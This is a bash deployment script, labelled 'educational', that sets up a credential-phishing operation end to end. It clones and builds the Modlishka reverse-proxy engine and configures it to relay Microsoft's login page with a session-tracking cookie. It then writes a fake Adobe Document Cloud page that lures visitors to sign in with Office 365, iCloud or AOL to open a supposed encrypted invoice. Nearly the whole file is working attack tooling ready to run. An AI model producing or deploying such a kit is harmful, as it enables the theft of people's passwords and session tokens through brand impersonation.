#!/bin/bash
# 🏛️ TROJAN.SH - AUTOMATED DEPLOYER (EDUCATIONAL)
# -----------------------------------------------
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[+] Starting Trojan.sh Auto-Deploy...${NC}"

# 1. INSTALL SYSTEM CORE
sudo apt update && sudo apt install -y golang-go git make certbot byobu unzip software-properties-common

# 2. SETUP GO 1.24 (Required for Engine)
if ! go version | grep -q "1.24"; then
    echo -e "${GREEN}[+] Installing Go 1.24...${NC}"
    sudo add-apt-repository ppa:longsleep/golang-backports -y && sudo apt update
    sudo apt install golang-1.24-go -y
    sudo ln -sf /usr/lib/go-1.24/bin/go /usr/bin/go
fi

# 3. DOWNLOAD & COMPILE ENGINE
cd /root
if [ ! -d "engine" ]; then
    echo -e "${GREEN}[+] Downloading and Compiling Engine...${NC}"
    git clone https://github.com/drk1wi/Modlishka.git engine
    cd engine && make && cd ..
fi

# 4. SETUP DIRECTORIES
mkdir -p /var/www/adobe_gui
mkdir -p /root/trojan_vault

# 5. CREATE MASTER CONFIG
cat << 'EOF' > /root/config.json
{
  "proxyDomain": "yourdomain.com",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "terminateRedirectUrl": "https://www.adobe.com",
  "trackingCookie": "trj_sid",
  "rules": [
    { "name": "gui", "target": "/", "phishing": "/", "type": "static", "path": "/var/www/adobe_gui/index.php" }
  ]
}
EOF

# 6. AUTOMATED MULTI-PORTAL ADOBE GUI
echo -e "${GREEN}[+] Writing Multi-Portal Adobe GUI...${NC}"
cat << 'EOF' > /var/www/adobe_gui/index.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Document Cloud - Shared File</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; width: 400px; padding: 35px; border-radius: 4px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 55px; margin-bottom: 20px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 8px; font-weight: 600; }
        p { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.4; }
        .provider-list { display: flex; flex-direction: column; gap: 14px; }
        .btn { display: flex; align-items: center; padding: 12px 20px; border: 1px solid #dcdcdc; border-radius: 6px; cursor: pointer; text-decoration: none; color: #333; font-weight: 500; font-size: 15px; transition: all 0.2s; }
        .btn:hover { background: #fdfdfd; border-color: #0078d4; }
        .btn img { width: 24px; height: 24px; margin-right: 18px; }
        .o365 { border-left: 5px solid #eb3c00; }
        .icloud { border-left: 5px solid #000; }
        .aol { border-left: 5px solid #ff0000; }
        .other { border-left: 5px solid #757575; }
        .footer { margin-top: 30px; font-size: 11px; color: #9a9a9a; border-top: 1px solid #eee; padding-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_Hex.svg" class="logo">
    <h2>Access Required</h2>
    <p>To view <b>"Encrypted_Invoice_PDF"</b>, please sign in with your email provider.</p>
    <div class="provider-list">
        <a href="/login" class="btn o365"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">Sign in with Office 365</a>
        <a href="/login" class="btn icloud"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">Sign in with iCloud</a>
        <a href="/login" class="btn aol"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg">Sign in with AOL</a>
        <a href="/login" class="btn other"><img src="https://cdn-icons-png.flaticon.com/512/281/281769.png">Other Email Provider</a>
    </div>
    <div class="footer">© 2026 Adobe Systems Incorporated.</div>
</div>
</body>
</html>
EOF

# 7. CREATE EASY RUN SCRIPT
cat << 'EOF' > /root/run.sh
#!/bin/bash
pkill proxy
echo "[+] Trojan.sh Engine starting..."
/root/engine/dist/proxy -config /root/config.json
EOF
chmod +x /root/run.sh

# 8. SET AUTO-START BYOBU
if ! grep -q "byobu" ~/.bashrc; then
    echo "[[ -z \"\$TMUX\" ]] && byobu" >> ~/.bashrc
fi

echo -e "${GREEN}[+] Trojan.sh is DEPLOYED.${NC}"
echo -e "${GREEN}[+] 1. Run 'source ~/.bashrc' to enter console.${NC}"
echo -e "${GREEN}[+] 2. Run './run.sh' to start.${NC}"
